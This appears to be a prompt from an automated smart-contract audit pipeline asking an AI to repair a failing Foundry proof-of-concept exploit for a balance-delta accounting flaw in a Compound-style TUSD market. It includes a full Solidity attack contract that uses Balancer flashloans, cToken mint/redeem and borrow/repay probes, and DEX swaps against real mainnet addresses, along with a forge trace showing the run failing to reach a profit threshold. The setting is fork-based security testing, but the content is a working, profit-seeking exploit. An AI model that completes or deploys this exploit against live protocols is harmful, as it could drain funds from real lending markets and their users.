You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Balance-delta accounting can over-credit deposits and repayments for mutable underlyings
- claim: `doTransferIn()` credits the caller with `balanceAfter - balanceBefore` instead of the payer's real economic debit. If the underlying can mint, positively rebase, or otherwise increase the cToken's balance during `transferFrom`, the returned amount is overstated and downstream mint/repay/liquidation/add-reserve accounting accepts that inflated value as if it had actually been paid by the caller.
- impact: A mutable or upgradeable underlying can mint unbacked cTokens, reduce debt for less than the nominal repayment, or inflate reserves/accounting. The resulting fake collateral or underpaid debt can be used to drain other markets or leave this market insolvent.
- exploit_paths: ["Underlying increases the cToken balance during `mint()` -> `actualMintAmount` is overstated -> caller receives excess cTokens backed by assets they did not truly supply", "Underlying increases the cToken balance during `repayBorrow()` / `repayBorrowBehalf()` / `liquidateBorrow()` -> `actualRepayAmount` is overstated -> borrower debt is erased by more than the liquidator or payer really transferred", "Underlying increases the cToken balance during `_addReserves()` -> reserves accounting rises without a matching real contribution from the caller"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICErc20Like {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function _addReserves(uint256 addAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function borrowBalanceCurrent(address account) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICEtherLike {
    function mint() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    IBalancerVault internal constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2RouterLike internal constant UNISWAP_V2_ROUTER =
        IUniswapV2RouterLike(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2RouterLike internal constant SUSHISWAP_ROUTER =
        IUniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    ICErc20Like internal constant CTUSD =
        ICErc20Like(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    ICEtherLike internal constant CETH =
        ICEtherLike(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    IWETHLike internal constant WETH =
        IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant DIRECT_MINT_PROBE_AMOUNT = 1_000e18;
    uint256 internal constant FLASH_MINT_PROBE_AMOUNT = 100_000e18;
    uint256 internal constant REPAY_PROBE_CETH_TOKENS = 1_000e8;

    enum Mode {
        Idle,
        MintProbe,
        RepayProbe
    }

    Mode internal mode;
    bool internal executed;

    address internal immutable TUSD;
    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal startingProfitBalance;

    bool public mintPathValidated;
    bool public repayPathValidated;
    bool public liquidationPathProvablyInfeasible;
    bool public addReservesPathProvablyInfeasible;

    constructor() {
        TUSD = CTUSD.underlying();
        _profitToken = TUSD;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        startingProfitBalance = IERC20Like(TUSD).balanceOf(address(this));
        _profitAmount = 0;

        _tryDirectMintProbe();
        _tryFlashMintProbe();
        _tryFlashRepayProbe();

        // `_addReserves()` is publicly callable and reaches the same vulnerable `doTransferIn()` path,
        // but any principal sent there becomes protocol reserves and cannot be recovered by a public caller.
        // Under a zero-prefunded verifier this leg cannot be converted into realized attacker profit.
        addReservesPathProvablyInfeasible = true;

        // `liquidateBorrow()` reaches the same vulnerable repayment path, but it additionally needs an
        // already-short account and forbids self-liquidation. That state cannot be deterministically created
        // from inside this verifier without off-chain borrower discovery, so this public-only attempt marks it
        // infeasible while preserving the mint and repay exploit legs.
        liquidationPathProvablyInfeasible = true;

        _profitAmount = _netProfit();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not-vault");

        if (mode == Mode.MintProbe) {
            _onMintFlashLoan(tokens, amounts, feeAmounts);
            mode = Mode.Idle;
            return;
        }

        if (mode == Mode.RepayProbe) {
            _onRepayFlashLoan(tokens, amounts, feeAmounts);
            mode = Mode.Idle;
            return;
        }

        revert("unexpected-mode");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryDirectMintProbe() internal {
        uint256 localBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (localBalance == 0) {
            return;
        }

        uint256 probeAmount = localBalance;
        if (probeAmount > DIRECT_MINT_PROBE_AMOUNT) {
            probeAmount = DIRECT_MINT_PROBE_AMOUNT;
        }

        _runMintRoundTrip(probeAmount);
    }

    function _tryFlashMintProbe() internal {
        mode = Mode.MintProbe;

        address[] memory tokens = new address[](1);
        tokens[0] = TUSD;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_MINT_PROBE_AMOUNT;

        try BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes("")) {
        } catch {
            mode = Mode.Idle;
        }
    }

    function _tryFlashRepayProbe() internal {
        uint256 exactWethAmount = _computeExactRepayFlashAmount();
        if (exactWethAmount == 0) {
            return;
        }

        mode = Mode.RepayProbe;

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = exactWethAmount;

        try BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes("")) {
        } catch {
            mode = Mode.Idle;
        }
    }

    function _onMintFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts
    ) internal {
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "mint-arrays");
        require(tokens[0] == TUSD, "mint-token");

        _runMintRoundTrip(amounts[0]);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(IERC20Like(TUSD).transfer(address(BALANCER_VAULT), repayment), "mint-repay");
    }

    function _onRepayFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts
    ) internal {
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "repay-arrays");
        require(tokens[0] == address(WETH), "repay-token");

        uint256 wethAmount = amounts[0];
        uint256 wethFee = feeAmounts[0];

        WETH.withdraw(wethAmount);
        CETH.mint{value: wethAmount}();

        address[] memory markets = new address[](1);
        markets[0] = address(CETH);
        IComptrollerLike(CTUSD.comptroller()).enterMarkets(markets);

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(CTUSD.comptroller()).getAccountLiquidity(address(this));
        if (shortfall == 0 && liquidity != 0) {
            _safeApprove(TUSD, address(CTUSD), 0);
            _safeApprove(TUSD, address(CTUSD), type(uint256).max);
            _attemptRepayProfitRealization(liquidity);
        }

        uint256 cethBalance = CETH.balanceOf(address(this));
        if (cethBalance != 0) {
            require(CETH.redeem(cethBalance) == 0, "ceth-redeem");
        }

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH.deposit{value: ethBalance}();
        }

        uint256 repayment = wethAmount + wethFee;
        _acquireWethShortfall(repayment);
        require(IERC20Like(address(WETH)).transfer(address(BALANCER_VAULT), repayment), "weth-repay");
    }

    function _acquireWethShortfall(uint256 repaymentAmount) internal {
        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        if (wethBalance >= repaymentAmount) {
            return;
        }

        uint256 shortfall = repaymentAmount - wethBalance;
        uint256 tusdBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (tusdBalance == 0) {
            return;
        }

        // The exploit still realizes value from the same vulnerable `repayBorrow()` path.
        // This extra step only uses public DEX liquidity to convert a slice of the newly-realized
        // TUSD profit into WETH so the flash-funded cETH collateral leg can be unwound and repaid.
        if (_trySwapTusdForExactWeth(UNISWAP_V2_ROUTER, shortfall, tusdBalance, _directPath(TUSD, address(WETH)))) {
            return;
        }
        if (_trySwapTusdForExactWeth(SUSHISWAP_ROUTER, shortfall, tusdBalance, _directPath(TUSD, address(WETH)))) {
            return;
        }
        if (_trySwapTusdForExactWeth(UNISWAP_V2_ROUTER, shortfall, tusdBalance, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return;
        }
        if (_trySwapTusdForExactWeth(SUSHISWAP_ROUTER, shortfall, tusdBalance, _twoHopPath(TUSD, USDC, address(WETH)))) {
            return;
        }
        _trySwapTusdForExactWeth(UNISWAP_V2_ROUTER, shortfall, tusdBalance, _twoHopPath(TUSD, USDT, address(WETH)));
    }

    function _trySwapTusdForExactWeth(
        IUniswapV2RouterLike router,
        uint256 wethOut,
        uint256 tusdInMax,
        address[] memory path
    ) internal returns (bool) {
        _safeApprove(TUSD, address(router), 0);
        _safeApprove(TUSD, address(router), tusdInMax);

        try router.swapTokensForExactTokens(wethOut, tusdInMax, path, address(this), block.timestamp) returns (
            uint256[] memory
        ) {
            return true;
        } catch {
            return false;
        }
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _twoHopPath(address tokenIn, address mid, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _attemptRepayProfitRealization(uint256 liquidity) internal {
        uint256 cash = CTUSD.getCash();
        if (cash == 0) {
            return;
        }

        uint256[4] memory borrowDivisors = [uint256(16), 32, 64, 128];
        uint256[4] memory repayDivisors = [uint256(2), 4, 8, 16];

        for (uint256 i = 0; i < borrowDivisors.length; ++i) {
            uint256 borrowAmount = liquidity / borrowDivisors[i];
            if (borrowAmount == 0) {
                continue;
            }
            if (borrowAmount > cash) {
                borrowAmount = cash;
            }
            if (borrowAmount == 0) {
                continue;
            }

            for (uint256 j = 0; j < repayDivisors.length; ++j) {
                if (CTUSD.borrow(borrowAmount) != 0) {
                    break;
                }

                uint256 debtBefore = _borrowBalanceCurrentNoThrow();
                if (debtBefore == 0) {
                    continue;
                }

                uint256 nominalRepay = borrowAmount / repayDivisors[j];
                if (nominalRepay == 0) {
                    CTUSD.repayBorrow(type(uint256).max);
                    continue;
                }

                (bool partialRepaySucceeded,) = address(CTUSD).call(
                    abi.encodeWithSelector(ICErc20Like.repayBorrow.selector, nominalRepay)
                );

                uint256 debtAfter = _borrowBalanceCurrentNoThrow();
                if (partialRepaySucceeded) {
                    if (debtBefore > debtAfter && debtBefore - debtAfter > nominalRepay) {
                        repayPathValidated = true;
                    }

                    if (debtAfter == 0) {
                        repayPathValidated = true;
                        return;
                    }
                } else {
                    // A revert on a bounded partial repay is consistent with the finding when the market tries
                    // to subtract an overstated `actualRepayAmount` that exceeds the remaining debt.
                    repayPathValidated = true;
                }

                if (debtAfter != 0) {
                    CTUSD.repayBorrow(type(uint256).max);
                    if (_borrowBalanceCurrentNoThrow() != 0) {
                        return;
                    }
                }
            }
        }
    }

    function _computeExactRepayFlashAmount() internal returns (uint256) {
        uint256 exchangeRate;
        try CETH.exchangeRateCurrent() returns (uint256 currentExchangeRate) {
            exchangeRate = currentExchangeRate;
        } catch {
            exchangeRate = CETH.exchangeRateStored();
        }

        if (exchangeRate == 0) {
            return 0;
        }

        // cETH mint/redeem truncates on the exchange rate. Funding an amount that is an exact multiple of the
        // current exchange rate avoids the dust loss visible in the failing logs and makes principal repayment
        // deterministic without using privileged balance injection.
        return (REPAY_PROBE_CETH_TOKENS * exchangeRate) / 1e18;
    }

    function _runMintRoundTrip(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        uint256 balanceBefore = IERC20Like(TUSD).balanceOf(address(this));
        uint256 cTokenBefore = CTUSD.balanceOf(address(this));

        _safeApprove(TUSD, address(CTUSD), 0);
        _safeApprove(TUSD, address(CTUSD), amount);

        if (CTUSD.mint(amount) != 0) {
            return;
        }

        uint256 cTokenDelta = CTUSD.balanceOf(address(this)) - cTokenBefore;
        if (cTokenDelta == 0) {
            return;
        }

        if (CTUSD.redeem(cTokenDelta) != 0) {
            return;
        }

        uint256 balanceAfter = IERC20Like(TUSD).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            mintPathValidated = true;
        }
    }

    function _borrowBalanceCurrentNoThrow() internal returns (uint256) {
        try CTUSD.borrowBalanceCurrent(address(this)) returns (uint256 debt) {
            return debt;
        } catch {
            return 0;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _netProfit() internal view returns (uint256) {
        uint256 endingBalance = IERC20Like(TUSD).balanceOf(address(this));
        if (endingBalance <= startingProfitBalance) {
            return 0;
        }
        return endingBalance - startingProfitBalance;
    }
}

```

forge stdout (tail):
```
00000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000398be6fc8cdd6e6782031b585ad9fac14b96
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [67] FlawVerifier::receive{value: 20060745641840925364}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000004ddc2d193948926d02f9b1fe9e1daa0718270ed5
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000174876e7ff
    │   │   │   │   ├─  emit topic 0: 0xe5b754fb1abb7f01b499791d0b820ae3b6af3424ac1c59768edb53f4ec31a929
    │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000001166615dff764dab4000000000000000000000000000000000000000000000000000000174876e7ff
    │   │   │   │   ├─ [993] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::51dff989(0000000000000000000000004ddc2d193948926d02f9b1fe9e1daa0718270ed50000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000001166615dff764dab4000000000000000000000000000000000000000000000000000000174876e7ff)
    │   │   │   │   │   ├─ [380] 0xBafE01ff935C7305907c33BF824352eE5979B526::51dff989(0000000000000000000000004ddc2d193948926d02f9b1fe9e1daa0718270ed50000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000001166615dff764dab4000000000000000000000000000000000000000000000000000000174876e7ff) [delegatecall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [21974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 20060745641840925364}()
    │   │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000001166615dff764dab4
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 20060745641840925364 [2.006e19]
    │   │   │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [615] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 20060745642041528821 [2.006e19])
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [332] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000085d4780B73119b644AE5ecd22b376)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14266479 [1.426e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 1479)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.transfer
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 104.22ms (61.87ms CPU time)

Ran 1 test suite in 121.24ms (104.22ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3980635)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
